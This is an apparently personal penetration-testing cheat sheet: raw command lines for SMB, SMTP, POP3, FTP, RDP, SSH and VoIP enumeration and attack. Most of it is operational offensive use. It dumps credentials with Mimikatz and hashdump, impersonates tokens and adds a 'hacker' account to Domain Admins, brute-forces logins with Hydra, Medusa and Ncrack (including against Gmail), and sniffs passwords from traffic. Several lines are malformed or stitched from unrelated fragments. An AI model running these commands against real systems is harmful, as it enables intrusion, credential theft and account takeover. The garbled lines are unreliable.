Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””
C:\>net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no


##-===================================-##
##   [+] Mount Remote Windows Share:
##-===================================-##
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw



smbtree -NS 2>/dev/null
nbtscan -r <current_IPrange>
netdiscover -r <current_IPrange>
nmap -n -Pn -T5 -sS <current_IPrange>




##-========================================-##
##   [+] NBTScan - Netbios Enumeration:
##-========================================-##
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt


##-=======================================================-##
##   [+] NBT name scan for addresses from 10.0.2.0/24
##-=======================================================-##
nbtscan -r 10.0.2.0/24


##-=======================================-##
##   [+] Netbios Information Scanning
##-=======================================-##
nbtscan -r $IP/24


##-===========================================-##
##   [+] Find Service Provided By Machines:
##-===========================================-##
nbtscan -hv $IP/24


##-========================================-##
##   [+] Show logged in users/addresses
##-========================================-##
nbtscan $TARGET -R 54



##-===========================================-##
##   [+] Nmap - find exposed Netbios servers
##-===========================================-##
nmap -sU --script nbstat.nse -p 137 $IP


##-========================================-##
##   [+] Nmap - Check target for Netbios vulns
##-========================================-##
nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 $IP


##-===========================================-##
##   [+] Nmap - Enumerate SMB Users
##-===========================================-##
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $IP-14


##-==============================================-##
##   [+] Nmap - List SMB Shares with no creds
##-==============================================-##
nmap --script smb-enum-shares -p 139,445 $IP
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   


##-====================================-##
##   [+] Nmap - Enumerate SMB users
##-====================================-##
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.0/24
python /usr/share/doc/python-impacket-doc/examples/samrdump.py $TARGET


nmap --script smb-enum-groups

##-========================================-##
##   [+] Nmap - SMB Vulnerability Scans
##-========================================-##
nmap --script="+\*smb\* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln; $IP


##-==============================================-##
##   [+] Nmap - SMB Scans - All NSE Vuln Scans 
##-==============================================-##
nmap -p139,445 $IP --script smb-vuln*


##-==========================================================-##
##   [+] Nmap - SMB Scans - NSE All Scans - Show All Vulns
##-==========================================================-##
nmap --script smb-* --script-args vulns.showall $IP -oN nmap_smb_$ip.txt


##-================================================-##
##   [+] Metasploit - SMB Scanner - RID Cycling
##-================================================-##
use auxiliary/scanner/smb/smb_lookupsid

ridenum



##-==========================================-##
##   [+] Metasploit - Dump Windows Hashes:
##-==========================================-##
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE


##-======================================-##
##   [+] Metasploit - Find The Admins
##-======================================-##
## spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] Metasploit - MimiKatz - Pentesting + Post Explotation
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


meterpreter > load mimikatz

meterpreter > kerberos

meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"


meterpreter > msv				## <-- Your AD password

meterpreter > livessp			## <-- Your Windows8 password

meterpreter > ssp				## <-- Your outlook password

meterpreter > tspkg				## <-- Your AD password

meterpreter > wdigest			## <-- Your AD password


meterpreter > mimikatz_command -f crypto::listStores

meterpreter > mimikatz_command -f crypto::listCertificates

meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER

meterpreter > mimikatz_command -f crypto::patchcapi







##-===============================-##
##   [+] Metasploit - MimiKatz:
##-===============================-##
meterpreter > load mimikatz
meterpreter > kerberos


meterpreter > msv				## <-- Your AD password

meterpreter > livessp			## <-- Your Windows8 password

meterpreter > ssp				## <-- Your outlook password

meterpreter > tspkg				## <-- Your AD password

meterpreter > wdigest			## <-- Your AD password


meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"


meterpreter > msv				## <-- Your AD password

meterpreter > livessp			## <-- Your Windows8 password

meterpreter > ssp				## <-- Your outlook password

meterpreter > tspkg				## <-- Your AD password



meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker password1 -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10
meterpreter > getuid
meterpreter > shell

C:\> whoami
mydom\adaministrator
C:\> net user $User /add /domain
C:\> net group "Domain Admins" $User /add /domain

##-=======================================-##
##   [+] Metasploit - Post Exploitation
##-=======================================-##
meterpreter> sysinfo


## ------------------------------------------------ ##
##   [?] Find Group Policy Preference XML files:
## ------------------------------------------------ ##
C:>findstr /S cpassword %logonserver%\sysvol\*.xml
meterpreter > post/windows/gather/credentials/gpp


##-======================================-##
##   [+] Meterpreter - Dump remote SAM:
##-======================================-##
meterpreter> run post/windows/gather/smart_hashdump



samdump2 -o out /mnt/ntfs/WINDOWS/system32/config/system /mnt/ntfs/WINDOWS/system32/config/sam



##-===========================-##
##   [+] Add Windows User:
##-===========================-##
net user $User password /ADD
net localgroup Administrators $User /ADD

net user $User password /ADD /DOMAIN
net group "Domain Admins" $User /ADD /DOMAIN

##-======================================-##
##   [+] Windows Information via Cmd
##-======================================-##
ipconfig /all
systeminfo
net localgroup administrators
net view
net view /domain
net accounts /domain
net group "Domain Admins" /domain




LFI Windows Files:

> $ %SYSTEMROOT%\repair\system  
> $ %SYSTEMROOT%\repair\SAM  
> $ %SYSTEMROOT%\repair\SAM  
> $ %WINDIR%\win.ini  
> $ %SYSTEMDRIVE%\boot.ini  
> $ %WINDIR%\Panther\sysprep.inf  
> $ %WINDIR%\system32\config\AppEvent.Evt  
> $ c:\windows\system32\drivers\etc\hosts













$HOME/.wireshark



wireshark --interface wlo1  -k -z -w  /var/log/wireshark.log 





--log-level "debug"



##  Write log messages and stderr output to the specified file
--log-file /var/log/wireshark.log



Only print messages for the specified log domains

--log-domains 






-z smb,srt[,filter]

Collect call/reply SRT (Service Response Time) data for SMB. 





-z "smb,srt,ip.addr==1.2.3.4"

collect stats only for SMB packets exchanged by the host at IP address 1.2.3.4







shows VoIP calls found in the capture file

-z voip,calls




-z wlan,stat[,<filter>]

           Show IEEE 802.11 network and station statistics




dumpcap
tcpcapinfo
getpcaps

ivstools
log2pcap

pcap-filter
pcapdump        
pcapfix         
pcapip          
pcappick        
pcapuc          
rawshark        
tcpliveplay     
tcpprep         
tcpreplay       
tcpreplay-edit  
tcprewrite      
tcpslice        

tcptrace (1)       
tcptracer-bpfcc (8)
tcptraceroute (1)  
tcptraceroute.db (8
tcptraceroute.mt (1
tcptrack (1)       
tcpxtract (1)      
tctrace
tcpslice (1)       
tcpstat

tcpflow (1)        
tcpick (8)         
tcpkill (8)        
tcplife.bt (8)     
tcplife-bpfcc (8)  
tcpnice (8)        
tcpprof (1)        
tcpreen

afl-gotcpu (8)     

rpc_soc (3t)       
clock_getcpuclockid
dns2tcpc (1)       
dns2tcpd (1)       
faked-tcp (1)      
fakeroot-tcp (1)   
tcpbridge (1)      
tcpcapinfo (1)     
tcpliveplay (1)    
tcpprep (1)        
tcpreplay (1)      
tcpreplay-edit (1) 
tcprewrite (1)     
flowgrind (1)      
flowgrind-stop (1) 
flowgrindd


















## ---------------------------------------------------------------------------------- ##
##    [?] SMB password dictionary attack tool that targets windows authentication
## ---------------------------------------------------------------------------------- ##
acccheck.pl -T smb-ips.txt -v



hydra  -v  -l Administrator -P fpass.lst smb://11.1.11.1 >> brute_smb.out
medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt >> brute_smb.out
hydra -L user.txt -P pass.txt -e ns -f -v -V -w5 10.10.10.2 smb >> brute_smb.out





##-=========================================================-##
##  [+] enum4linux - Enumerate using SMB (null session)
##-=========================================================-##
enum4linux -a $IP


##-=========================================================-##
##  [+] enum4linux - Enumerate using SMB (w/user & pass)
##-=========================================================-##
enum4linux -a -u $User -p $Pass $IP


##-===============================-##
##  [+] enum4linux - bash-loop
##-===============================-##
for targets in $(cat $File.txt); do enum4linux $targets; done


##-====================================-##
##  [+] enum4linux - 
##-====================================-##
enum4linux -a -v -M -l -d $1


##-====================================-##
##  [+] enum4linux - 
##-====================================-##
enum4linux -a -v -M -l -d $1 2>&1 | tee "enum4linux_$1.txt"




nbtscan-unixwiz -f $TARGET



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] Braa is a mass snmp scanner
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
braa public@192.168.1.215:.1.3.6.*




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] VoIP/SIP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=========================================================================================-##
##   [+] ACE (Automated Corporate Enumerator) - VoIP Corporate Directory enumeration tool
##-=========================================================================================-##

##-===================================================================-##
##   [+] automatically discover TFTP Server IP via DHCP Option 150
##-===================================================================-##
ace -i eth0 -m 00:1E:F7:28:9C:8e


##-===========================================-##
##   [+] specify IP Address of TFTP Server: 
##-===========================================-##
ace -i eth0 -t 192.168.10.150 -m 00:1E:F7:28:9C:8e


##-===================================-##
##   [+] specify the Voice VLAN ID: 
##-===================================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E

##-======================-##
##   [+] Verbose mode: 
##-======================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E -d

##-===============================-##
##   [+] remove vlan interface: 
##-===============================-##
ace -r eth0.96

##-==================================================================-##
##   [+] auto-discover voice vlan ID in the listening mode for CDP: 
##-==================================================================-##
ace -i eth0 -c 0 -m 00:1E:F7:28:9C:8E

##-==================================================================-##
##   [+] auto-discover voice vlan ID in the spoofing mode for CDP: 
##-==================================================================-##
ace -i eth0 -c 1 -m 00:1E:F7:28:9C:8E



sip-methods.nse
sip-enum-users.nse
sip-call-spoof.nse
sip-brute.nse




sipvicious
audit SIP based VoIP systems

svmap, svwar, svcrack, svreport, svcrash.

svmap - sip scanner used to identify any SIP servers

svwar identifies working extension lines on a PBX.




iaxflood - VoIP flooder tool -  IAX payload.



protos-sip - SIP test suite



voiphopper

yersinia
siparmyknife
sctpscan




cisco-auditing-tool
Scans Cisco routers for vulnerabilities



rtpbreak, 
rtpflood, 
rtpinsertsound, 
rtpmixsound




## --------------------------------------------------------- ##
##    [?] ohrwurm - RTP fuzzer that targets SIP phones
## --------------------------------------------------------- ##



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] CDPSnarf is a network sniffer exclusively written to extract information from CDP packets.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
cdpsnarf -i eth0 -w cdpsnarf.pcap





##  show which user recently logged in
for i in $(cat users);do finger $i $i@192.168.78.148;done


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SMTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##






smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET


##-=============================================-##
##   [+] Metasploit - SMTP Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "smtp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=25 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;


##-========================================-##
##   [+] Nmap - Run all SMTP NSE Scans:
##-========================================-##
nmap -p 25 --script=smtp-* $TARGET



##-=======================================================-##
##   [+] Nmap - Enumerate SMTP Users Via VRFY NSE Scan:
##-=======================================================-##
nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 $IP


##-=============================================================-##
##   [+] SMTP-User-Enum - Show which users are on the system:
##-=============================================================-##
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $IP
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP -v


##-==========================================================-##
##   [+] Test for SMTP user enumeration (RCPT TO and VRFY)
##   [+] Test for internal spoofing, and MITM relay.
##-==========================================================-##
ismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt


##-==========================================-##
##   [+] SMTPRecon - SMTP Recon
##-==========================================-##
smtprecon.py $IP


##-================================================================-##
##   [+] Metasploit - Auxiliary Scanner - SMTP Enumeration Scan:
##-================================================================-##
use auxiliary/scanner/smtp/smtp_enum


##-=======================================-##
##   [+] THC-Hydra - Brute force SMTP:
##-=======================================-##
hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -f 



##-==========================================-##
##   [+] Medusa - SMTP Brute Force Attack:
##-==========================================-##
medusa -M smtp -m AUTH:NTLM -U accounts.txt -p password
medusa -M smtp -m EHLO:world -U accounts.txt -p password


##-===============================================-##
##   [+] Medusa - SMTP VRFY Brute Force Attack:
##-===============================================-##
medusa -M smtp-vrfy -m VERB:VRFY -U accounts.txt -p $Domain


##-=======================================================-##
##   [+] SMTP-User-Enum - SMTP VRFY Brute Force Attack:
##-=======================================================-##
smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
smtp-user-enum -M VRFY -U /home/weak_wordlist/userall.txt -t $IP


##-====================================================-##
##   [+] Medusa - SMTP (RCPT TO) Brute Force Attack:
##-====================================================-##
medusa -M smtp-vrfy -m VERB:RCPT TO -U accounts.txt -p $Domain


##-===============================================-##
##   [+] Patator - SMTP VRFY Brute Force Attack:
##-===============================================-##
patator.py smtp_vrfy timeout=15 host=$IP user=FILE0 0=/usr/share/seclists/Usernames/Names/names.txt


##-====================================================-##
##   [+] THC-Hydra - SMTP Server Brute Force Attack:
##-====================================================-##
hydra server smtp -l $User@gmail.com -P wordlist -s port -S -v -V


##-=============================================-##
##   [+] THC-Hydra - SMTP Brute Force Attack:
##-=============================================-##
hydra smtp.gmail.com smtp -l $User@gmail.com -P /home/user/Desktop/rockyou.txt -s 465 -S -v -V



##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25
openssl s_client -connect smtp.office365.com:587 -starttls smtp
gnutls-cli-debug --starttls-proto smtp --port 25 localhost



##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -connect smtp.gmail.com:587 -starttls smtp < /dev/null 2>/dev/null |
openssl x509 -fingerprint -noout -in /dev/stdin | cut -d'=' -f2


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
sudo -u postfix openssl s_client -showcerts -starttls smtp -connect smtp.gmail.com:587 < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -CApath /etc/ssl/certs -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null






##-===================================-##
##  [+] Capture SMTP / POP3 Email
##-===================================-##
## ----------------------------------- ##
##  [?] Parse the email recipients
## ----------------------------------- ##
tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'







xsstracer $TARGET 80
















tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] POP3 - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


nmap -p 110 --script=pop3-* $TARGET



##-=======================================-##
##   [+] THC-Hydra - Brute Force - POP3
##-=======================================-##
hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -f 




medusa -M pop3 -m MODE:AS400 -U accounts.txt -p password
medusa -M pop3 -m DOMAIN:foo.com -U accounts.txt -p password
hydra -l muts -P pass.txt my.pop3.mail pop3 >> brute_pop3.out
hydra -S -l myemailaddress@hotmail.co.uk -P password.lst pop3.live.com -s 995 pop3 >> brute_pop3.out




##-=========================================-##
##   [+] secure POP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:995
openssl s_client -crlf -connect server.server.net:110 -starttls pop3



##-=============================================-##
##   [+] Metasploit - POP3 Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "pop" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=110 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] IMAP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


imap-capabilities.nse
imap-ntlm-info.nse
imap-brute.nse


##-=========================================-##
##   [+] secure IMAP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:993
openssl s_client -ssl3 -connect imap.gmail.com:993
gnutls-cli imap.gmail.com -p 993




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] FTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##





##-===========================================================-##
##   [+] NMap - FTP - NSE Modules - Vuln Scans + Backdoors:
##-===========================================================-##
nmap -n -Pn -sV $IP -p $PORT --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN /$Dir/ftp_$IP-$PORT.nmap



##-========================================================================-##
##   [+] NMap - FTP - NSE Modules - All Scans - Except Brute,DOS,Fuzzer:
##-========================================================================-##
nmap -p 21 --script="+\*ftp\* and not brute and not dos and not fuzzer" -vv -oN ftp; $IP


##-===========================================-##
##   [+] NMap - FTP - All NSE Module Scans:
##-===========================================-##
nmap -p 21 --script=ftp-* $TARGET


##-==============================================================-##
##   [+] NMap - FTP - NSE Modules - All Scans + Vulners Scans:
##-==============================================================-##
nmap -A -sV -Pn -sC -p 21 -v --script-timeout 90 --script=ftp-*,/usr/share/nmap/scripts/vulners $Domain | tee ~/Downloads/NMap-$Domain-FTP-Port21.txt



##-==========================================-##
##   [+] Metasploit - FTP Version Scanner:
##-==========================================-##
msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET";
use auxiliary/scanner/ftp/ftp_version; run



##-============================================-##
##   [+] Metasploit - Anonymous FTP Scanner:
##-============================================-##
msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; 
use auxiliary/scanner/ftp/anonymous; run; exit;" | tee ~/Downloads/msf-$TARGET-FTP-Port21-Anonymous.raw





##-=======================================-##
##   [+] THC-Hydra - Brute Force - FTP
##-=======================================-##


hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -f -o $OUTPUT/ftphydra_$IP-$PORT -u $IP -s $PORT ftp"


hydra -L $User.txt -P $Passlist.txt ftp://$IP
hydra -l $User -P $Passlist.txt ftp://$IP

hydra -l superuser -P pwd.txt -v -f -e ns -t 5 -w 20 $IP ftp >> brute_ftp.out
hydra -t 5 -V -f -l root -P $PassFile.txt ftp://$IP >> brute_ftp.out
hydra -v -f -l ftp -P $PassFile.lst -t 10 ftp://$IP >> brute_ftp.out
hydra -l root -P 500-worst-passwords.txt $IP ftp



medusa -u test -P 500-worst-passwords.txt -h $IP -M ftp
medusa -M ftp -h host -u $User -p $Pass




patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500

patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500


patator ssh_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD --max-retries 0 --timeout 10 -x ignore:time=0-3



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "ftp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=$LHOST RHOST=$TARGET RHOSTS=$TARGET RPORT=21 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;








##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TFTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-============================================-##
##   [+] NMap - TFTP - All NSE Module Scans:
##-============================================-##
nmap -A -sU -sV -Pn -v --script-timeout 90 --script=tftp*,/usr/share/nmap/scripts/vulners -p 69 $TARGET






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] RDP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-================================-##
##  [+] NMap - RDP - NSE Scans:
##-================================-##
nmap --script rdp-ntlm-info.nse $IP
nmap --script rdp-enum-encryption.nse $IP
nmap --script rdp-vuln-ms12-020.nse $IP
nmap --script rlogin-brute.nse $IP


##-=======================================-##
##   [+] THC-Hydra - Brute Force - RDP
##-=======================================-##
hydra -l admin -P /root/Desktop/$PassFile -S X.X.X.X rdp
hydra -l admin -P /root/Desktop/$PassFile -S $IP rdp




medusa -u administrator -P /usr/share/john/password.lst -h 10.10.10.71 -M rdp
ncrack -p rdp -u administrator --pass '$Pass' -iL in2
hydra -v -f -l administrator -P common.txt rdp://192.168.67.132 // not good
ncrack -vv --user $User -P $PassFile.txt rdp://10.10.10.10



##-========================================-##
##  [+] RDesktop - RDP Remote Connection:
##-========================================-##
rdesktop -u $User -p $Pass $TARGET



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] VNC - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-================================-##
##  [+] NMap - VNC - NSE Scans:
##-================================-##
nmap --script vnc-info.nse $IP
nmap --script vnc-title.nse $IP
nmap --script vnc-brute.nse $IP





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Wake-On-LAN - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-==============================================-##
##  [+] NMap - Wake-on-LAN Broadcast NSE Scan
##-==============================================-##
nmap --script broadcast-wake-on-lan.nse $IP






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SSH - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



medusa -h $IP -P /$Dir/$PassFile -u $User -M ssh
medusa -h 10.10.XX -P /root/pasword.txt -u root -M ssh


ncrack -p ssh -u $User --pass '$Pass' -iL in
ncrack -p ssh -u root --pass 'root' -iL in

--proxy

ncrack -v --user root localhost:22
  ncrack -v -T5 https://192.168.0.1
  ncrack -v -iX ~/nmap.xml -g CL=5,to=1h



ncrack $Domain:21 ftp://10.0.0.10

ssh://192.168.1.*:22

192.168.0.0/8 10.0.0,1,3-7.- -p22


-v

--append-output
--resume <file>: Continue previously saved session
             --save <file>: Save restoration file with specific filename



##-=======================================-##
##   [+] THC-Hydra - Brute Force - SSH
##-=======================================-##
hydra -t 5 -V -f -l root -P common.txt localhost ssh >> brute_ssh.out
hydra -v -l root -P 500-worst-passwords.txt 10.10.10.10 ssh >> brute_ssh.out
hydra -v -l root -P fpass.lst -t 5 ssh://ip -o brute_ssh.out

hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -f 


for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "ssh" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=22 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS KEY_PATH=$KEY_PATH VERBOSE=false E; done;


nmap -p 22 --script=ssh-* $TARGET
nmap -A -sV -Pn -sC -p 22 -v --script-timeout 90 --script=ssh-*,/usr/share/nmap/scripts/vulners $TARGET



##-==================================================-##
##   [+] Metasploit - SSH User Enumeration Scanner:
##-==================================================-##
msfconsole -q -x '$(setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_enumusers; run)'





ssh-audit $TARGET:22



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Telnet - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nmap -p 22 --script=telnet-* $TARGET


hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -f 



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "telnet" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=$LHOST RPORT=23 RHOST=$TARGET RHOSTS=$TARGET USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;



cisco-torch -A $TARGET














iptraf -i "wlan0"




wpscan --url www.vyxunbnbs.com/mobile --enumerate u --url $ip/blog --proxy $ip:3129




routersploit


Metasploit Scanning

auxiliary/scanner/*

portscan/tcp
http/http_version
http/tomcat_enum
http/trace_axd






EyeWitness
eyewitness --web						##  HTTP Screenshot using Selenium
eyewitness -f $File						##  Line-separated file containing URLs to capture
eyewitness -x $File.xml				##  Nmap XML or .Nessus file
eyewitness --single $URL			##  Single URL/Host to capture
eyewitness --proxy-type socks5 --proxy-ip 10.64.0.1 --proxy-port 1080				##  
eyewitness --proxy-type socks5 --proxy-ip 10.8.0.1 --proxy-port 1080				##  
eyewitness --difference				##  
eyewitness --user-agent				##  
eyewitness -d /$Dir/ 				##  
eyewitness --max-retries 5				##  
--only-ports 443,1080




https://github.com/ChrisTruncer/Just-Metadata



daemonlogger darkstat 
dns_browse dnsbulktest dnsenum dnsgram dnshistory dnsmap dnsping dnsrecon dbus-send dnsscan dnsscope dnssec-trust-anchors.d dnsspoof dnstap-read  
dnstap-read dnstcpbench dnstop dnstracer dnstraceroute dns_tree dnstwist dnswalk dnswasher dnsdomainname dnseval nss-tlsd pdns_notify resolvectl sdig systemd.dnssd unbound-host validns 

dhcpdump dhcpig dhcp-options danetool dhcpd.conf dane_verification_status_print dirb dmitry 
dialog

People Search
Switchboard - http://www.switchboard.com/person

Zaba - http://www.zabasearch.com/






curl -sL --header "Host:viewdns.info" --referer https://viewdns.info --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" https://viewdns.info/reversewhois/?q=%40$Domain


